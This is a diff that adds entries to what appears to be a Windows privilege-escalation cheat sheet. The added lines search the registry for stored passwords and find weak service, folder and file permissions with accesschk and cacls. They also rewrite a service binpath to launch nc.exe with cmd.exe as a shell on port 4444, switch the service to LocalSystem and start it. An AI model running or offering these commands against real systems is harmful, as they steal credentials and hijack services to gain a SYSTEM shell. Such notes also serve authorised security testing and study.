@@ -106,6 +106,56 @@ dir /a "C:\Program Files (x86)"
 reg query HKEY_LOCAL_MACHINE\SOFTWARE
 ```
 
+## register query word password (1)
+```
+reg query HKLM /f password /t REG_SZ /s
+```
+
+## register query word password (2)
+```
+reg query HKCU /f password /t REG_SZ /s
+```
+
+## check service privilege
+```
+accesschk.exe /accepteula -ucqv <service_name>
+```
+
+## reconfigure service
+```
+sc config <service> binpath= "C:\nc.exe -nv 127.0.0.1 4444 -e C:\WINDOWS\System32\cmd.exe"
+```
+
+## change service 
+```
+sc config <service> obj= ".\LocalSystem" password= ""
+```
+
+## start service
+```
+net start <service>
+```
+
+## check permission (1)
+```
+accesschk.exe /accepteula -dqv "<file>"
+```
+
+## check permission (2)
+```
+cacls "<file>"
+```
+
+## find weak folder permission
+```
+accesschk.exe -uwdqs Users <c>:\
+```
+
+## find weak file permission
+```
+accesschk.exe -uwqs Users <c>:\
+```
+
 % windows, download
 
 ## VBS download file script
